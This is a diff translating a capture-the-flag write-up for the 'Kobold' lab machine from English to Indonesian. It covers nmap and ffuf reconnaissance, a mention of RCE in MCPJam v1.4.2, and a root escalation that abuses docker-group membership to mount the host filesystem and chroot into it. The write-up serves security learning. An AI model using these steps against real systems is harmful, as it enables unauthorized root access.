@@ -5,7 +5,7 @@
 ```
 nmap -sC -sV -oA kobold 10.xxx.xx.xxx
 ```
-Result:
+Hasil:
 ```
 PORT    STATE SERVICE  VERSION
 22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
@@ -23,14 +23,14 @@ PORT    STATE SERVICE  VERSION
 |_  http/1.1
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-- Add domain **kobold.htb** to **/etc/hosts**
-- Virtual host discovery using ffuf
+- Tambahkan domain **kobold.htb** ke **/etc/hosts**
+- Virtual host discovery dengan ffuf
 ```
 ffuf -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -w subdomains-top1million-5000.txt -fs 154
 ```
-- Found 2 subdomains, **bin** and **mcp**. Add to **/etc/hosts**
-- Subdomain **mcp** is MCPJam Version: v1.4.2, visible on settings page
-- RCE via `/api/mcp/connect` endpoint
+- Menemukan 2 subdomains, **bin** dan **mcp**. Tambahkan ke **/etc/hosts**
+- Subdomain **mcp** adalah MCPJam Versi: v1.4.2, Terlihat di halaman settings
+- RCE elalui endpoint `/api/mcp/connect`
 
 ## 2. Gaining access
 - Listener
@@ -53,7 +53,7 @@ export TERM=xterm
 ```
 
 ## 3. Privilege Escalation
-- Check id
+- Cek id
 ```
 ben@kobold:~$ id
 id
@@ -71,42 +71,42 @@ ben@kobold:~$ systemctl list-units --type=service --state=running
   docker.service            loaded active running Docker Application Container >
   ...
 ```
-- Operator group has permission to switch to the docker group
-- Docker daemon run as root and listen on a socket at `/var/run/docker.sock`
-- Who has r/w access to this socket can execute commands to Docker as root, including running containers that mount the host file system
+- Grup operator memiliki izin untuk berpindah ke grup docker
+- Docker daemon run sebagai root dan listen pada socket di `/var/run/docker.sock`
+- Siapapun yang memiliki akses r/w ke socker ini bisa mengeksekusi perintah docker sebagai root, termasuk menjalankan konteiner yg dapat mount file system host
 ```
 ben@kobold:~$ ls -l /var/run/docker.sock
 srw-rw---- 1 root docker 0 Apr 10 02:09 /var/run/docker.sock
 ```
-- Show running containers
+- Tampilkan kontainer yang berjalan
 ```
 ben@kobold:~$ docker ps
 permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.50/containers/json": dial unix /var/run/docker.sock: connect: permission denied
 ```
-- Add ourselves to the docker group
+- Tambahkan saya sendiri ke grup docker
 ```
 ben@kobold:~$ newgrp docker
 ```
-- Show running containers
+- Tampilkan kontainer yang berjalan
 ```
 ben@kobold:~$ docker ps
 CONTAINER ID   IMAGE                               COMMAND                  CREATED       STATUS          PORTS                      NAMES
 4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   "/etc/init.d/rc.local"   7 weeks ago   Up 26 minutes   127.0.0.1:8080->8080/tcp   bin
 ```
-- Exploiting root
+- Exploitasi root
 ```
 docker run -it -v /:/mnt --rm -u root --entrypoint /bin/sh privatebin/nginx-fpm-alpine:2.0.2
 ```
-- Break down:
-  - `docker run`: run new container from an image.
-  - `-i`: interactive
+- Penjelasan:
+  - `docker run`: menjalankan kontainer baru dari sebuah image.
+  - `-i`: interaktif
   - `-t`: TTY
-  - `-v /:/mnt`: volume mount from `/` to `/mnt`
-  - `--rm`: auto remove container after exit
-  - `-u root`: force container to run as root user
-  - `--entrypoint /bin/sh`: ignore the default image command (eg: start nginx) and immediately run the shell
+  - `-v /:/mnt`: volume mount dari `/` ke `/mnt`
+  - `--rm`: auto remove container setelah exit
+  - `-u root`: memaksa kontainer untuk berjalan sebagai root
+  - `--entrypoint /bin/sh`: abaikan perintah default dari image (seperti: start nginx) dan langsung menjalankan shell
   - `privatebin/nginx-fpm-alpine:2.0.2`: target image
-- Take control the host
+- (Opsional) ambil kontrol host
 ```
 chroot /mnt /bin/bash
 ```
